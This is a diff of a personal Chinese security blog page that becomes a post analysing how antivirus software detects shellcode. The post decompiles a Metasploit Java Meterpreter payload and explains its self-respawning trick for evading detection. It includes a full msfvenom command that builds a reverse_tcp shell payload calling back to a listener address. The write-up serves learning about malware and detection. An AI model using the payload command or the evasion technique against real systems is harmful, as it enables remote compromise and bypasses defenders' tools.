@@ -6,15 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>Archives: 2022 | Solkatt的小窝</title>
+  <title>ShellCode上线分析 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="https://example.com/archives/2022/index.html">
+  <meta name="description" content="杀毒软件对文件危险的判定等级从文件落地到磁盘上开始，杀毒软件就已经对落地文件进行了扫描与检测，这里我们需要知道杀毒软件对文件危险系数的判定等级。 1.无害 无害等级，没有任何问题。杀毒软件从此不会管你。 2.可疑 如果确定文件为可疑等级，那么杀毒软件会持续监控软件的行为特征。 3.确认病毒 如果确定文件为病毒，那么杀毒软件就会直接把文件刀掉。 国内外杀毒软件的区别在上一步中，国内外杀毒软件对文件的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ShellCode上线分析">
+<meta property="og:url" content="https://example.com/2022/05/01/ShellCode%E4%B8%8A%E7%BA%BF%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="杀毒软件对文件危险的判定等级从文件落地到磁盘上开始，杀毒软件就已经对落地文件进行了扫描与检测，这里我们需要知道杀毒软件对文件危险系数的判定等级。 1.无害 无害等级，没有任何问题。杀毒软件从此不会管你。 2.可疑 如果确定文件为可疑等级，那么杀毒软件会持续监控软件的行为特征。 3.确认病毒 如果确定文件为病毒，那么杀毒软件就会直接把文件刀掉。 国内外杀毒软件的区别在上一步中，国内外杀毒软件对文件的">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501132016384.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501133229998.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501161157650.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501165147001.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501165641907.png">
+<meta property="article:published_time" content="2022-05-01T04:03:36.000Z">
+<meta property="article:modified_time" content="2022-05-01T08:59:51.291Z">
 <meta property="article:author" content="Solkatt">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501132016384.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -142,350 +152,185 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-ShellCode上线分析" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      ShellCode上线分析
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/05/01/ShellCode%E4%B8%8A%E7%BA%BF%E5%88%86%E6%9E%90/" class="archive-article-date">
+
+        
+        <a href="/2022/05/01/ShellCode%E4%B8%8A%E7%BA%BF%E5%88%86%E6%9E%90/" class="archive-article-date">
   	<time datetime="2022-05-01T04:03:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-01</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/05/01/ShellCode%E4%B8%8A%E7%BA%BF%E5%88%86%E6%9E%90/">ShellCode上线分析</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="杀毒软件对文件危险的判定等级"><a href="#杀毒软件对文件危险的判定等级" class="headerlink" title="杀毒软件对文件危险的判定等级"></a>杀毒软件对文件危险的判定等级</h1><p>从文件落地到磁盘上开始，杀毒软件就已经对落地文件进行了扫描与检测，这里我们需要知道杀毒软件对文件危险系数的判定等级。</p>
+<p>1.无害</p>
+<p>无害等级，没有任何问题。杀毒软件从此不会管你。</p>
+<p>2.可疑</p>
+<p>如果确定文件为可疑等级，那么杀毒软件会持续监控软件的行为特征。</p>
+<p>3.确认病毒</p>
+<p>如果确定文件为病毒，那么杀毒软件就会直接把文件刀掉。</p>
+<h1 id="国内外杀毒软件的区别"><a href="#国内外杀毒软件的区别" class="headerlink" title="国内外杀毒软件的区别"></a>国内外杀毒软件的区别</h1><p>在上一步中，国内外杀毒软件对文件的检测是有区别的。</p>
+<p>国内杀毒软件的病毒库,md5目的是不让病毒有落脚点。相当于把重点放在第一和第三等级的区分（宁可误杀，不可错过）。</p>
+<p>而国外的杀毒软件会注重于第二等级的分析，会把重点放在内存查杀、监控等（宁可错过，不可误杀）。</p>
+<h1 id="杀毒软件查杀的方式"><a href="#杀毒软件查杀的方式" class="headerlink" title="杀毒软件查杀的方式"></a>杀毒软件查杀的方式</h1><p>这个是老生常谈的话题了，这里就简单列举重复一下</p>
+<h2 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h2><h3 id="代码存在的函数"><a href="#代码存在的函数" class="headerlink" title="代码存在的函数"></a>代码存在的函数</h3><p>将shellcode加载到内存当中，必须使用windows的api函数。</p>
+<p>所以一些危险的函数（特别是指内存、堆、栈、线程相关的函数）会被加入静态特征库。比如 <code>Virtualalloc</code>,<code>rtlmovememory</code>,<code>ntcreatthread</code>等。</p>
+<p>当然某些代码中的关键词也会被识别。比如在python中有<code>Subprocess.popen</code>，java中有<code>Runtime.exec</code>等。</p>
+<h3 id="shellcode的特征"><a href="#shellcode的特征" class="headerlink" title="shellcode的特征"></a>shellcode的特征</h3><p>像msf，cs等工具生成的shellcode都是一样的，所以会被加入特征库</p>
+<h3 id="文件名称或md5"><a href="#文件名称或md5" class="headerlink" title="文件名称或md5"></a>文件名称或md5</h3><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>使用加解密行为的文件，或者对文件有加壳措施都会被识别为可疑文件，静态查杀中也会对其进行关注。</p>
+<h2 id="动态"><a href="#动态" class="headerlink" title="动态"></a>动态</h2><p>通常在静态分析之后会有一个动态的查杀过程，部分杀毒软件会有沙盒。</p>
+<h3 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h3><p>沙盒：也叫做启发式查杀，通过模拟计算机的环境执行目标文件再观察特征行为。</p>
+<p>沙盒模拟的常见特征：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">内存较小：不影响计算机正常运行</span><br><span class="line">时间较快：沙盒内置的时间速比现实世界要快，提高查杀速度</span><br><span class="line">进程或文件不完整：为了减少杀毒软件运行时对计算机的消耗，会少很多关键dll文件。</span><br><span class="line">io设备缺失：鼠标键盘等设备大部分沙盒都没有（毕竟没多少用）</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
-          
+<h3 id="行为检测"><a href="#行为检测" class="headerlink" title="行为检测"></a>行为检测</h3><p>行为检测是指杀毒软件对于一些事件（一些操作）进行行为检测，当触发这些条件时就会做出对应的应对措施。</p>
+<h4 id="计算机内部相关"><a href="#计算机内部相关" class="headerlink" title="计算机内部相关"></a>计算机内部相关</h4><p><code>服务</code>,<code>注册表</code>,<code>组策略</code>,<code>防火墙</code>,<code>敏感程序（cmd,powershell,wmi,psexec,rundll）</code>，<code>用户添加、删除、修改等操作文件夹</code>（c:/windows/system32等）</p>
+<h4 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h4><p>socket外联，小马拉大马操作，ip，域名等安全匹配,流量内容等。</p>
+<h1 id="MeterPreter源码分析"><a href="#MeterPreter源码分析" class="headerlink" title="MeterPreter源码分析"></a>MeterPreter源码分析</h1><p>使用msf首先生成一个jar源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.137.133 LPORT=4444 &gt; 1.jar</span><br></pre></td></tr></table></figure>
 
+<p>接下来使用软件<code>jd-gui</code>反编译源码进行分析。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501132016384.png" alt="image-20220501132016384"></p>
+<p>可以看到我们有三个文件分别是<code>MANIFEST.MF</code>,<code>PAYLOAD.CLASS</code>,<code>METASPLOIT.DAT</code></p>
+<p>这里为了方便看，我把他们打包出来放在了idea里面。我们一个个来分析。</p>
+<p>首先是<code>MANIFEST.MF</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: metasploit.Payload</span><br><span class="line">Permissions: all-permissions</span><br><span class="line"></span><br><span class="line">Name: metasploit.dat</span><br><span class="line"></span><br><span class="line">Name: metasploit/Payload.class</span><br></pre></td></tr></table></figure>
+
+<p>这个文件的作用主要是为了告诉java虚拟机我们打开一个jar包需要从哪儿开始运行。可以看到它告诉虚拟机这个程序需要我们从metasploit文件夹下Payload这个文件开始运行。</p>
+<p>再接着是<code>metasploit,dat</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Spawn=2</span><br><span class="line">LHOST=192.168.137.133</span><br><span class="line">LPORT=4444</span><br></pre></td></tr></table></figure>
+
+<p>这个文件是指定了我们的LHOST和LPORT，这个spawn字段稍后解释。</p>
+<p>最后就是<code>Payload.class</code>文件</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501133229998.png" alt="image-20220501133229998"></p>
+<p>可以看到这里代码量很长，我们就截取几段重点的来分析。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501161157650.png" alt="image-20220501161157650"></p>
+<p>首先开头是文件自动获取一些系统信息，其中有你的操作系统信息还有路径分隔符信息。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501165147001.png" alt="image-20220501165147001"></p>
+<p>这里创建了一个配置文件，用来读取上面提到的<code>metasploit,dat</code>文件。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220501165641907.png" alt="image-20220501165641907"></p>
+<p>这里进行了一系列的创建文件操作（都是为了获得文件的绝对路径），其最终的目的是为了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行以下系统命令</span><br><span class="line">Runtime.getRuntime().exec(java -classpath C:\Users\59559\AppData\Local\Temp\~spawn745237515843902655.tmp.dir\metasploit\Payload.class) </span><br></pre></td></tr></table></figure>
+
+<p>这样做的目的是再次拉起我们的payload.class文件（拉起自己），但是不同的是SPAWN值进行了改变。接下来又进行了下一次的循环。</p>
+<p>总结了一下，该文件进行了内存循环二次(让SPAWN字段从2变为了0)的操作，其目的是在于躲避杀软，它进行了多次拉取后在使用socket链接，相当于就是为了混淆杀软的内存特征。并且使用了小马拉大马的操作，这样可以让我们的文件变小，减少了特征。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/05/01/ShellCode%E4%B8%8A%E7%BA%BF%E5%88%86%E6%9E%90/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/04/27/%E4%BD%BF%E7%94%A8windowsapi%E8%B0%83%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/" class="archive-article-date">
-  	<time datetime="2022-04-26T16:56:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2022/04/27/%E4%BD%BF%E7%94%A8windowsapi%E8%B0%83%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">使用windowsapi调用注册表操作</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/04/27/%E4%BD%BF%E7%94%A8windowsapi%E8%B0%83%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/">使用windowsapi调用注册表操作</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/04/24/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E4%B8%8E%E5%8F%8D%E7%97%85%E6%AF%92%E4%BB%8B%E7%BB%8D/" class="archive-article-date">
-  	<time datetime="2022-04-24T15:13:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/04/24/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E4%B8%8E%E5%8F%8D%E7%97%85%E6%AF%92%E4%BB%8B%E7%BB%8D/">恶意代码与反病毒介绍</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2022-04-11T03:38:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">常见中间件漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/" class="archive-article-date">
-  	<time datetime="2022-03-25T02:41:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/">Liunx提权靶场一游</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2022-03-21T08:20:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/">shellcode的基础免杀</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/" class="archive-article-date">
-  	<time datetime="2022-03-21T08:20:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/">shellcode的基础免杀</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/" class="archive-article-date">
-  	<time datetime="2022-03-09T13:19:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/">浅谈UAC及绕过</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-03-06T09:10:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/">域林渗透</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" class="archive-article-date">
-  	<time datetime="2022-03-06T07:20:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">域渗透--pth与委派攻击</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2022/page/2/">2</a><a class="page-number" href="/archives/2022/page/3/">3</a><a class="extend next" rel="next" href="/archives/2022/page/2/">Next &amp;raquo;</a>
-    </nav>
   
 
 
@@ -509,8 +354,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
